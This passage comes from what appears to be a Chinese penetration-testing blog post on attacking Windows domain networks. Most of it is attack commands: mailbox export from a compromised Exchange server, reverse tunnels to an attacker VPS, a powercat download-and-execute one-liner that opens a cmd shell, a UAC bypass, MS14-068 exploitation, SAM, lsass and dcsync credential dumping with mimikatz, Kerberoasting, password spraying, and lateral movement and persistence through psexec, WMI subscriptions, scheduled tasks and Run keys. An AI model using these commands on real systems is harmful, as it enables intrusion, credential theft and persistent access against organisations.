+<p>​    在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList  -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016  -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>信息收集</p>
+</blockquote>
+<p>​    当我们拿下exchange服务器后，可以做一些信息收集，包括不限于用户、邮件。</p>
+<p>​    获取所有邮箱用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Mailbox</span><br></pre></td></tr></table></figure>
+
+<p>​    导出邮件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MailboxexportRequest  -mailbox username -FilePath (&quot;\\localhost\c$\test\username.pst&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>​    也可以通过web口导出，登录：</p>
+<p>​    <a target="_blank" rel="noopener" href="https://mail.domain.com/ecp/">https://mail.domain.com/ecp/</a></p>
+<p>​    导出后会有记录，用如下命令可以查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-MailboxExportRequest</span><br></pre></td></tr></table></figure>
+
+<p>​    删除某个导出记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-MailboxExportRequest  -Identity &#x27;username\mailboxexport&#x27; -Confirm:$false</span><br></pre></td></tr></table></figure>
+
+<h2 id="传输通道"><a href="#传输通道" class="headerlink" title="传输通道"></a>传输通道</h2><p>在做完信息收集后，为了方便进一步内网渗透，一般都会建立一个通道，甚至是多级跳板。</p>
+<p><strong>是否出网</strong></p>
+<p>可以用以下命令判断:</p>
+<table>
+<thead>
+<tr>
+<th>ping</th>
+<th align="left">icmp</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>curl</td>
+<td align="left">http</td>
+</tr>
+<tr>
+<td>nslookup</td>
+<td align="left">dns</td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>Netsh</strong></p>
+<p>netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
+<p>A机器执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1  protocol=tcp</span><br></pre></td></tr></table></figure>
+
+<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
+<hr>
+<p><strong>SSH</strong></p>
+<p>SSH一般被拿来登录linux机器，也可以拿来做代理和转发。</p>
+<p>假设有两台服务器A和B：A处于内网无公网IP，B是一个云主机如阿里云有公网IP，现在手头上有一台处于校外网的电脑C，想用ssh登录服务器A完成一些骚操作，怎么弄呢？很简单，<strong>原理是让B建立对A的临时ssh反向代理通道，然后用C登录B就可以直接ssh进入A了</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">							内网穿透</span><br><span class="line">内网A执行（这里会要求输入B的账号密码）：</span><br><span class="line">	ssh -fCNR 14444:localhost:22 aliyun_user@aliyun_IP</span><br><span class="line">如ssh -fCNR 119.23.31.7:14444:localhost:22 root@119.23.31.7  再输入119.23.31.7的密码</span><br><span class="line"># 解释  ssh -fCNR [B机器IP或省略]:[B机器端口]:[A机器的IP]:[A机器端口] [登陆B机器的用户名@服务器IP]</span><br><span class="line"># 也即是输入密码后 建立B主机（119.23.31.7）的14444端口到自己的22端口反向代理，此时连接119.23.31.7:14444即可连接到A机器</span><br><span class="line">							内网流量转发</span><br><span class="line">用proxychains等类似工具连接本地的1111端口的sock5连接即可代理119.23.31.7的网络</span><br><span class="line">	ssh -qTfnN -D 1111 root@119.23.31.7</span><br><span class="line">控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C：</span><br><span class="line">A机器执行：</span><br><span class="line">ssh -CNfg -L 2121:CIP:21 root@BIP</span><br><span class="line">输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。</span><br><span class="line">	ssh -CNfg -L 2121:CIP:21 root@BIP</span><br><span class="line">	ssh -CNfg -R 2121:BIP:21 root@hackervps</span><br><span class="line">控制A机器，A能够访问B：</span><br><span class="line">A机器执行：</span><br><span class="line">	ssh -CNfg -R 2121:BIP:21 root@hackervps</span><br><span class="line">输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口。</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>reGeorg</strong></p>
+<p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，使用http代理进入内网。</p>
+<p>根据网站支持的语言，把相应的tunnel.xx传到服务器上，访问tunnel.xx显示“Georg says, ‘All seems fine’”，说明基本ok。</p>
+<p>本地运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythonreGeorgSocksProxy.py -p 9999 -u http://1.1.1.1:8080/tunnel.xx</span><br></pre></td></tr></table></figure>
+
+<p>利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络。</p>
+<hr>
+<p><strong>EarthWorm</strong></p>
+<p>​    EarthWorm是一款用于开启SOCKS v5代理服务的工具，基于标准C开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</p>
+<p><strong>受害者机器有外网ip并可直接访问：</strong></p>
+<p>把ew传到对方服务器上，执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 8888</span><br></pre></td></tr></table></figure>
+
+<p>现在本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络。</p>
+<p><strong>控制A机器，A能够访问B，通过A访问B：</strong></p>
+<p>在自己外网服务器上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p>对方服务器执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d yourvpsip -e 8888</span><br></pre></td></tr></table></figure>
+
+<p>利用proxychains等类似工具可通过连接你的外网vps的1080 端口的socks5，即可代理受害者服务器的网络。</p>
+<p><strong>控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C：</strong></p>
+<p>B机器执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<p>A机器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f BIP -g 9999</span><br></pre></td></tr></table></figure>
+
+<p>利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络。</p>
+<p><strong>控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C：</strong></p>
+<p>自己vps执行：</p>
+<p>./ew -s lcx_listen -l 1080 -e 8888</p>
+<p>B机器执行：</p>
+<p>./ew -s ssocksd -l 9999</p>
+<p>A机器执行：</p>
+<p>./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999</p>
+<p>利用proxychains等类似工具可通过连接你自己的vps的1080 端口的socks5，即可代理B服务器的网络。</p>
+<hr>
+<p><strong>lcx</strong></p>
+<p>​    lcx是一款轻便的端口转发工具。</p>
+<p><strong>反向转发</strong></p>
+<p>外网VPS机器监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 1111 2222</span><br></pre></td></tr></table></figure>
+
+<p>受害者机器执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave VPSip 1111 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
+<hr>
+<p><strong>正向转发</strong></p>
+<p>A机器执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 1111 2.2.2.2 8080</span><br></pre></td></tr></table></figure>
+
+<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
+<hr>
+<p><strong>powercat</strong></p>
+<p>powercat是一款ps版nc。可以本地执行，也可以远程下载执行，远程执行命令如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat-l -p 8000 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后远程连接执行命令即可。如果嫌弃该命令太暴露，可以对其进行编码。</p>
+<p><strong>mssql</strong></p>
+<p>当目标机器只开放mssql时，我们也可以利用mssql执行clr作为传输通道。</p>
+<p>环境如下：</p>
+<h2 id><a href="#" class="headerlink" title></a><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104237064.png" alt="image-20200701104237064" style="zoom:50%;"></h2><p>工具项目地址：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>明明是administrator权限，为什么有些命令执行不了？拿到一个普通的域用户权限后，如何拿到域控权限？均属于提权</p>
+<p><strong>3.1、UAC</strong></p>
+<p>UAC，即用户账户控制，其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序损坏系统的效果。在系统上直观看起来类似于这样：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104420462.png" alt="image-20200701104420462"></p>
+<p>那如何寻找bypass uac的方法呢。我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</p>
+<p>以高权限运行的进程图标一般有如下标志：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104445027.png" alt="image-20200701104445027"></p>
+<p>Win10以ComputerDefaults.exe作为bypass案例，ComputerDefaults.exe进程图标确实有个uac的标志（然后你双击打开会发现并没有uac提醒）</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104509045.png" alt="image-20200701104509045"></p>
+<p>利用ProcessMonitor对该进程的行为做一个监听：</p>
+<p>先寻找HKCU:\Software\Classes\ms-settings\Shell\Open\Command 注册表，然后发现键值不存在，再寻找HKCR:\ms-settings\Shell\Open\Command\DelegateExecute</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104535673.png" alt="image-20200701104535673"></p>
+<p>当修改HKCU\Software\Classes\下的键值时，会同步修改HKCR下面的键值。</p>
+<hr>
+<p><strong>ms14-068</strong></p>
+<p>该漏洞可以在只有一个普通域用户的权限时，获取到域控权限。微软已经修复了该漏洞，对应的补丁号为kb3011780。下面介绍下漏洞的成因，先来一个Kerberos协议流程图：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104742291.png" alt="image-20200701104742291"></p>
+<p>大致流程如下：</p>
+<p>1、域用户登录时，向KDC的AS服务以自身密码加密的时间戳进行预认证；</p>
+<p>2、域控的AS服务验证用户的密码是否正确。验证通过后，返回给用户一张TGT票据，该票据为krbtgt密码加密而成；</p>
+<p>3、域用户拿着TGT向KDC的TGS服务申请访问Application Server的票据</p>
+<p>4、域控的TGS服务验证TGT通过后，返回给域用户能够访问Application Server的票据，即ST，ST以Application Server的服务账号密码加密；</p>
+<p>5、域用户拿着ST访问对应的Application Server；</p>
+<p>6、Application Server验证ST，决定成功与否。</p>
+<p>下面简述ms14-068的问题所在：</p>
+<p>TGT中作为用户凭证，包含了用户名、用户id、所属组等信息，即PAC。简单点讲，PAC就是验证用户所拥有权限的特权属性证书。</p>
+<p>默认PAC是包含在TGT中的，而出现ms14-068这个问题的原因在于用户在申请TGT时可以要求KDC返回的TGT不包含PAC（include-PAC为false），然后用户自己构造PAC并放入TGS_REQ数据包中的REQ_BODY中，KDC会解密PAC并加密到一个新的TGT中（正常应该返回一个ST）并返回给用户，此时这个TGT已经带入了我们构造的恶意的PAC。后面就是正常的kerberos流程了。</p>
+<p>利用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python  ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d  &lt;domainControlerAddr&gt; </span><br><span class="line">mimikatz.exe  &quot;kerberos::ptc TGT_user@domain.ccache&quot; exit</span><br><span class="line">	也可以使用goldenPac.py来达到ms14-068+psexec的自动化利用：</span><br><span class="line">goldenPac.py  domain.com/username:password@dc.domain.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>密码抓取已经成为渗透中必不可少的一项技能。一个管理员很可能管理着N多台机器，但是密码使用的都是同一个或者是有规律的。如果抓到一台机器的密码，利用同密码碰撞，很可能这个渗透项目就结束了。本节主要介绍密码抓取的原理和一些手段。</p>
+<p><strong>NTLMhash和NET-NTLMhash</strong></p>
+<p>先简单介绍下LMhash和NTLMhash。</p>
+<p>我们经常看到的hash长这样：</p>
+<blockquote>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
+</blockquote>
+<p>他的组成就是:</p>
+<blockquote>
+<p>user:sid:lmhash:ntlmhash</p>
+</blockquote>
+<p>LMhash的加密流程如下：</p>
+<p>1、密码长度限制为14个字符</p>
+<p>2、密码全部转换为大写</p>
+<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
+<p>4、密码的16进制字符串被分成两个7byte部分</p>
+<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
+<p>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
+<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
+<p>为了解决LMhash强度不够的问题，微软推出了NTLMhash：</p>
+<p>1、先将用户密码转换为十六进制格式。</p>
+<p>2、将十六进制格式的密码进行Unicode编码。</p>
+<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
+<p>因为在vista后不再支持LMhash，因此抓到的hash中的LMhash都是aad3b435b51404eeaad3b435b51404ee</p>
+<p>在hash传递攻击时，可以替换成0：</p>
+<p>00000000000000000000000000000000</p>
+<p>再看下ntlm认证的过程：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701105635401.png" alt="image-20200701105635401"></p>
+<p>他的简述流程如下：</p>
+<p>1、客户端向服务端发起认证</p>
+<p>2、服务器收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。并使用登录用户密码hash加密Challenge，获得Challenge1</p>
+<p>3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p>
+<p>4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。</p>
+<p>上述中的response类似于下面这样：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701105705878.png" alt="image-20200701105705878"></p>
+<p>上述中的response就可以理解为net-ntlmhash，因此ntlmhash我们是可以拿来hash传递的，而net-ntlmhash不可以，但是net-ntlmhash也可以拿来做破解和relay。</p>
+<p><strong>本地用户凭据(dump出NTLM-hash)</strong></p>
+<p>在windows上，C:\Windows\System32\config目录保存着当前用户的密码hash。我们可以使用相关手段获取该hash。</p>
+<p>使用reg命令获取本地用户凭据hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM SAM.hive</span><br><span class="line">reg save HKLM\system system.hive</span><br><span class="line">reg save HKLM\security security.hive</span><br></pre></td></tr></table></figure>
+
+<p>最后可利用bootkey解密获取hash，其他工具举例pwdump7、mimikatz</p>
+<p>mimikatz：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+<p>从lsass.exe中获取也可以。如直接使用mimikatz获取(明文密码)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>Procdump+Mimikatz：</p>
+<p>procdump64.exe  -accepteula -ma lsass.exe lsass.dmp</p>
+<p>mimikatz.exe  “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords  full” exit</p>
+<p>为什么有的抓不到明文密码，主要由于kb2871997的问题。</p>
+<p>kb2871997补丁会删除除了wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用。用户可以选择将HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential更改为0来禁用。</p>
+<p>它在winserver 2012 R2及以上版本已默认集成。在winserver 2012R2上面测试，手动添加上述注册表的值为1，然后抓密码，发现只有wdigest能抓到明文密码了</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110411871.png" alt="image-20200701110411871"></p>
+<p>kb2871997除了“解决”上述明文密码问题，还“解决”了pth问题，但是kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名)和本地管理员组的域用户是没有影响的。</p>
+<hr>
+<p><strong>域hash</strong></p>
+<p>当拿到域控权限时，可以从域控中的C:\Windows\NTDS\NTDS.dit（NTDS字典）导出所有用户hash。因为ntds.dit被占用，因此需要利用如卷影备份等手段copy出ntds.dit，然后利用如NTDSDumpEx.exe解析hash：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110603669.png" alt="image-20200701110603669"></p>
+<p>当拷贝ntds.dit时，由于网络、文件大小等问题，可以使用DRS协议获取hash凭据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe  privilege::debug &quot;lsadump::dcsync /domain:jumbolab.com /all /csv&quot;  exit</span><br></pre></td></tr></table></figure>
+
+<p>有时为什么能抓到明文密码，有时并不能呢，除了上面说的kb2871997的问题以外，还有个“Reversible Encryption”。</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110657757.png" alt="image-20200701110657757"></p>
+<hr>
+<p><strong>token窃取</strong></p>
+<p>​    token是一个描述进程或线程安全上下文的对象。token即令牌包括了与进程或线程关联的用户账号的标识和特权，当用户登录时，系统通过将用户密码与安全数据库进行比对来验证用户密码正确性，如果密码正确，系统将生成访问token。该用户的进程都携带该token，可以利用DuplicateTokenEx api对现有token的复制，然后使用CreateProcessWithToken api对复制的token创建一个新的进程。效果如下：</p>
+<p>有个system权限进程：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110745561.png" alt="image-20200701110745561"></p>
+<p>以administrator权限窃取该进程token，成功获取system权限：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110806552.png" alt="image-20200701110806552"></p>
+<hr>
+<p><strong>Kerberoasting</strong></p>
+<p>在KRB_TGS_REP中，TGS会返回给Client一张票据ST，而ST是由Client请求的Server端密码进行加密的。当Kerberos协议设置票据为RC4方式加密时，我们就可以通过爆破在Client端获取的票据ST，从而获得Server端的密码。</p>
+<p>在上述SPN信息收集中得到一个域用户test注册了一个SPN，我们请求TGS：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell执行</span><br><span class="line">$SPNName = &#x27;test/test&#x27;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  $SPNName</span><br></pre></td></tr></table></figure>
+
+<p>再利用mimikatz导出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list  /export</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701111635702.png" alt="image-20200701111635702"></p>
+<p>然后利用tgsrepcrack暴力破解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt 2-40a10000-win7user@test\~test-JUMBOLAB.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>最终成功获取该域用户密码：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701111704460.png" alt="image-20200701111704460"></p>
+<hr>
+<p><strong>密码喷射</strong></p>
+<p>在内网中，也可以尝试对smb、3389、mssql弱口令进行密码暴力破解，但是要注意线程，密码数不要太多。当然，也可以使用不同账号，同个密码进行尝试。这里使用kerbrute对域用户/密码进行暴力破解：</p>
+<p>爆破用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute  userenum -d jumbolab.com usernames.txt</span><br></pre></td></tr></table></figure>
+
+<p>密码喷射:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute passwordspray -d jumbolab.com username.txt  aA1234567</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>LAPS</strong></p>
+<p>LocalAdministrator Password Solution是密码解决方案，为了防止一台机器被抓到密码后，然后网内都是同密码机器导致被横向渗透。但是也存在相应的安全隐患，当我们拿下域控时，可以查看计算机本地密码;当权限配置不当时，也会导致其他用户有权限查看他人计算机本地密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershellGet-ADComputer  computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</span><br></pre></td></tr></table></figure>
+
+<p>如果安装LAPS，在安装的软件列表里能看到：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701111929762.png" alt="image-20200701111929762"></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>当我们获取到某个机器账号密码、获取到hash了，后续我们应该怎么做，如何做，这就是本章介绍的内容。当然，当我们拿下更多的机器时，别忘记了，信息收集必不可少。</p>
+<p><strong>账号密码链接</strong></p>
+<p>当我们获取到机器的账号密码的时候，可以尝试用以下几种方式进行连接并执行命令。</p>
+<p><strong>IPC</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\1.1.1.1\ipc$  “password” /user:username</span><br></pre></td></tr></table></figure>
+
+<p><strong>Psexec</strong></p>
+<p>用服务启动的方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec  \\target -accepteula -u username -p  password cmd.exepsexec.py  jumbolab.com/administrator@172.16.127.184</span><br></pre></td></tr></table></figure>
+
+<p><strong>WMI</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">wmic  /user:&quot;jumbolab.com\win7user&quot; /password:&quot;password&quot;  /node:172.16.127.184 process call create &quot;notepad&quot; #  </span><br><span class="line">方法二</span><br><span class="line">Invoke-WmiMethod  -class win32_process -name create -argumentlist &#x27;notepad&#x27; -ComputerName  172.16.127.184 -Credential &#x27;jumbolab.com\win7user&#x27; </span><br><span class="line">#  方法三</span><br><span class="line">$filterName  = &#x27;BotFilter82&#x27;</span><br><span class="line">$consumerName  = &#x27;BotConsumer23&#x27;</span><br><span class="line">$exePath  = &#x27;C:\Windows\System32\notepad.exe&#x27;</span><br><span class="line">$Query  = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE  TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;</span><br><span class="line">$WMIEventFilter  = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot;  -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125;  -ErrorAction Stop -ComputerName 172.16.127.184 -Credential  ‘jumbolab.com\win7user’</span><br><span class="line">$WMIEventConsumer  = Set-WmiInstance -Class CommandLineEventConsumer -Namespace  &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath&#125;  -ComputerName 172.16.127.184 -Credential  ‘jumbolab.com\win7user’</span><br><span class="line">Set-WmiInstance  -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot;  -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>dSchtasks</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks  /create /s 1.1.1.1 /u domain\Administrator /p password /ru &quot;SYSTEM&quot;  /tn &quot;windowsupdate&quot; /sc DAILY  /tr &quot;calc&quot; /F schtasks  /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</span><br></pre></td></tr></table></figure>
+
+<p><strong>AT</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at  \\1.1.1.1 15:15 calc</span><br></pre></td></tr></table></figure>
+
+<p><strong>SC</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc  \\1.1.1.1 create windowsupdate binpath= &quot;calc&quot;sc  \\1.1.1.1 start windowsupdate</span><br></pre></td></tr></table></figure>
+
+<p><strong>REG</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  \\1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t  REG_SZ /d &quot;calc&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>DCOM</strong></p>
